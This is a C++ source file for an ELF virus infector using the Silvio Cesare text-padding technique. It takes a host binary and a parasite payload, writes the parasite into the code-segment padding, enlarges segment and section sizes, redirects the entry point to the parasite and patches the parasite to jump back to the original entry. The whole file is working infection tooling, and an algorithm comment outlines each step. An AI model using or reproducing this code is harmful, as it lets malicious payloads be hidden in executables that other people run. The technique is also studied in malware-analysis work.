#include <elf.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <iostream>
#include <optional>
#include "common/file_descriptor.hh"
#include "common/mmap.hh"
#include "common/patch_pattern.hh"

bool silvio_infect(vt::common::Mmap<PROT_READ> host_mapping,
                   vt::common::Mmap<PROT_READ | PROT_WRITE> parasite_mapping,
                   vt::common::Mmap<PROT_READ | PROT_WRITE> output_mapping);

int main(int argc, char** argv) {
  if (argc != 4) {
    std::cerr << fmt::format(
                     "[*] Usage {} <host> <payload> <virus>\n"
                     "\thost: the elf to be infected\n"
                     "\tpayload: the payload that will be added to the host\n"
                     "\toutput the infected output\n",
                     argv[0])
              << std::endl;

    return EXIT_FAILURE;
  }

  vt::common::FileDescriptor host(argv[1], O_RDONLY);
  if (!host.valid()) {
    LOG(ERROR) << "failed open host: " << std::strerror(errno);
    return EXIT_FAILURE;
  }

  vt::common::FileDescriptor parasite(argv[2], O_RDONLY);
  if (!parasite.valid()) {
    LOG(ERROR) << "failed to open parasite: " << std::strerror(errno);
    return EXIT_FAILURE;
  }

  vt::common::FileDescriptor output(argv[3], O_CREAT | O_RDWR, S_IRWXU);
  if (!output.valid()) {
    LOG(ERROR) << "failed to open output file: " << std::strerror(errno);
    return EXIT_FAILURE;
  }

  ftruncate(output.handle(), host.file_size());

  vt::common::Mmap<PROT_READ> host_mapping(host.file_size(), MAP_SHARED,
                                           host.handle(), 0);
  vt::common::Mmap<PROT_READ> parasite_mapping(parasite.file_size(), MAP_SHARED,
                                               parasite.handle(), 0);
  vt::common::Mmap<PROT_READ | PROT_WRITE> output_mapping(
      output.file_size(), MAP_SHARED, output.handle(), 0);

  vt::common::Mmap<PROT_READ | PROT_WRITE> parasite_cpy(
      parasite.file_size(), MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
  std::copy(parasite_mapping.base(),
            parasite_mapping.base() + parasite_mapping.size(),
            parasite_cpy.mutable_base());

  if (silvio_infect(vt::move(host_mapping), vt::move(parasite_cpy),
                    vt::move(output_mapping))) {
    LOG(INFO) << "infected " << argv[1];

    return EXIT_SUCCESS;
  }

  return EXIT_FAILURE;
}

/********************  ALGORITHM   *********************


--- Load parasite from file into memory
1.	Get parasite_size and parasite_code addresss (location in allocated
memory)


--- Find padding_size between CODE segment and the NEXT segment after CODE
segment 2.	CODE segment : increase
                -> p_filesz 		(by parasite size)
                -> p_memsz 			(by parasite size)
        Get and Set respectively,
        padding_size 	= (offset of next segment (after CODE segment)) - (end
of CODE segment) parasite_offset = (end of CODE segment) or (end of last section
of CODE segment)


---	PATCH Host entry point
3.	Save original_entry_point (e_entry) and replace it with parasite_offset


--- PATCH SHT
4.  Find the last section in CODE Segment and increase -
        -> sh_size          (by parasite size)


--- PATCH Parasite offset
5.	Find and replace Parasite jmp exit addresss with original_entry_point
0x????????


---	Inject Parasite to Host @ host_mapping
6.	Inject parasite code to (host_mapping + parasite_offset)


7.	Write infection to disk x_x

*/

struct SilvioElfInfo {
  uint64_t padding_size;
  Elf64_Off code_segment_end_offset;
  Elf64_Off parasite_offset;
  Elf64_Addr parasite_load_address;
  Elf64_Xword& p_filesz;
  Elf64_Xword& p_memsz;
};

// Patch SHT (i.e. find the last section of CODE segment and increase its size
// by parasite_size)
bool patch_sht(vt::common::Mmap<PROT_READ | PROT_WRITE>& output_mapping,
               size_t parasite_size, Elf64_Off code_segment_end_offset) {
  auto base = output_mapping.mutable_base();
  auto elf_header = reinterpret_cast<const Elf64_Ehdr*>(base);

  auto sht_offset = elf_header->e_shoff;
  auto sht_entry_count = elf_header->e_shnum;

  // Point shdr (Pointer to iterate over SHT) to the last entry of SHT
  auto section_entry = reinterpret_cast<Elf64_Shdr*>(base + sht_offset);

  for (size_t i = 0; i < sht_entry_count; ++i) {
    auto current_section_end_offset =
        section_entry->sh_offset + section_entry->sh_size;
    if (code_segment_end_offset == current_section_end_offset) {
      // This is the last section of CODE Segment
      // Increase the sizeof this section by a parasite_size to accomodate
      // parasite
      section_entry->sh_size += parasite_size;
      return true;
    }
    // Move to the next section entry
    ++section_entry;
  }
  return false;
}

// Returns gap size (accomodation for parasite code in padding between CODE
// segment and next segment after CODE segment) padding size,
// code_segment_end_offset, parasite_offset, parasite_load_address
std::optional<SilvioElfInfo> get_info(char* host_mapping,
                                      uint64_t parasite_size) {
  Elf64_Ehdr* elf_header = (Elf64_Ehdr*)host_mapping;
  uint16_t pht_entry_count = elf_header->e_phnum;
  Elf64_Off pht_offset = elf_header->e_phoff;
  Elf64_Off code_segment_end_offset = 0;
  Elf64_Off parasite_offset = 0;
  Elf64_Addr parasite_load_address;

  // Point to first entry in PHT
  Elf64_Phdr* phdr_entry = (Elf64_Phdr*)(host_mapping + pht_offset);

  // Parse PHT entries
  uint16_t CODE_SEGMENT_FOUND = 0;

  for (int i = 0; i < pht_entry_count; ++i) {
    // Find the CODE Segment (containing .text section)
    if (CODE_SEGMENT_FOUND == 0 && phdr_entry->p_type == PT_LOAD &&
        phdr_entry->p_flags == (PF_R | PF_X)) {
      CODE_SEGMENT_FOUND = 1;

      // Calculate the offset where the code segment ends to bellow calculate
      // padding_size
      code_segment_end_offset = phdr_entry->p_offset + phdr_entry->p_filesz;
      parasite_offset = code_segment_end_offset;
      parasite_load_address = phdr_entry->p_vaddr + phdr_entry->p_filesz;
    }

    // Find next segment after CODE Segment and calculate padding size
    if (CODE_SEGMENT_FOUND == 1 && phdr_entry->p_type == PT_LOAD &&
        phdr_entry->p_flags == (PF_R | PF_W)) {
      // Return padding_size (maximum size of parasite that host can accomodate
      // in its padding between the end of CODE segment and start of next
      // loadable segment)
      return SilvioElfInfo{
          .padding_size = phdr_entry->p_offset - parasite_offset,
          .code_segment_end_offset = code_segment_end_offset,
          .parasite_offset = parasite_offset,
          .parasite_load_address = parasite_load_address,
          .p_filesz = (phdr_entry - 1)->p_filesz,
          .p_memsz = (phdr_entry - 1)->p_memsz};
    }

    ++phdr_entry;
  }

  return std::nullopt;
}

bool silvio_infect(vt::common::Mmap<PROT_READ> host_mapping,
                   vt::common::Mmap<PROT_READ | PROT_WRITE> parasite_mapping,
                   vt::common::Mmap<PROT_READ | PROT_WRITE> output_mapping) {
  int HOST_IS_EXECUTABLE = 0;       // Host is LSB Executable
  int HOST_IS_SHARED_OBJECT = 0;    // Host is a Shared Object
  Elf64_Addr original_entry_point;  // Host entry point

  {
    // Identify the binary & SKIP Relocatable, files and 32-bit class of
    // binaries
    const Elf64_Ehdr* host_header =
        reinterpret_cast<const Elf64_Ehdr*>(host_mapping.base());
    if (host_header->e_type == ET_REL || host_header->e_type == ET_CORE)
      return false;
    else if (host_header->e_type == ET_EXEC) {
      HOST_IS_EXECUTABLE = 1;
      HOST_IS_SHARED_OBJECT = 0;
      LOG(INFO) << "host is executable";
    } else if (host_header->e_type == ET_DYN) {
      HOST_IS_SHARED_OBJECT = 1;
      HOST_IS_EXECUTABLE = 0;
      LOG(INFO) << "host is SO";
    }
    if (host_header->e_ident[EI_CLASS] == ELFCLASS32) {
      return false;
    }
  }
  // Copy host to output
  std::copy(host_mapping.base(), host_mapping.base() + host_mapping.size(),
            output_mapping.mutable_base());

  // Get Home size (in bytes) of parasite residence in host
  // and check if host's home size can accomodate a parasite this big in size
  auto info = get_info(output_mapping.mutable_base(), parasite_mapping.size());

  if (!info) {
    LOG(ERROR) << "Cannot correctly parse host elf";
  }
  if (info->padding_size < parasite_mapping.size()) {
    LOG(INFO) << "[+] Host cannot accomodate parasite, parasite is angry x_x";
    return false;
  }

  // Patch program header table and increase text section size.
  info->p_filesz += parasite_mapping.size();
  info->p_memsz += parasite_mapping.size();

  // Patch elf header entry point to run the parasite.
  Elf64_Ehdr* output_header =
      reinterpret_cast<Elf64_Ehdr*>(output_mapping.mutable_base());
  original_entry_point = output_header->e_entry;
  if (HOST_IS_EXECUTABLE)
    output_header->e_entry = info->parasite_load_address;
  else if (HOST_IS_SHARED_OBJECT)
    output_header->e_entry = info->parasite_offset;

  // Patch section header table to increase text section size
  if (!patch_sht(output_mapping, parasite_mapping.size(),
                 info->code_segment_end_offset)) {
    LOG(INFO) << "Failed to patch section header table";
    return false;
  }

  // Patch parasite to jump back to original entry.
  if (!vt::common::patch<Elf64_Addr>(
          parasite_mapping.mutable_base(), parasite_mapping.size(),
          0xAAAAAAAAAAAAAAAA, original_entry_point)) {
    LOG(INFO) << "Failed to patch parasite pattern";
    return false;
  }

  // ????????????????????????????????????????????????????????????????????????????????????????????

  // Inject parasite in Host
  memcpy(output_mapping.mutable_base() + info->parasite_offset,
         parasite_mapping.base(), parasite_mapping.size());
  return true;
}
